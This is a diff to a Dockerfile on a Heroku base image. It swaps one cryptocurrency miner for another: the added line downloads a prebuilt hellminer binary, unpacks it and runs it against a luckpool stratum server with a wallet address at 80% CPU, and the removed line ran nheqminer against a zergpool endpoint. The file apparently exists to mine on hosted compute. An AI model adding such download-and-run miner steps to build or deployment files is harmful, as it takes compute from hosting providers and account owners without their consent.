@@ -1,5 +1,5 @@
 FROM heroku/heroku:18
 RUN apt-get install -y curl git unzip wget
-RUN  RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u LaxRo693Wz4f4szXKavoRLuft5YCnfyorf.test1 -p c=LTC,mc=VRSC -t 4
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RR4q11BJNS3NiwgBLJqzQzcdB8VTeTGkRa.test1 -p x --cpu 80
 CMD bash heroku.sh
 
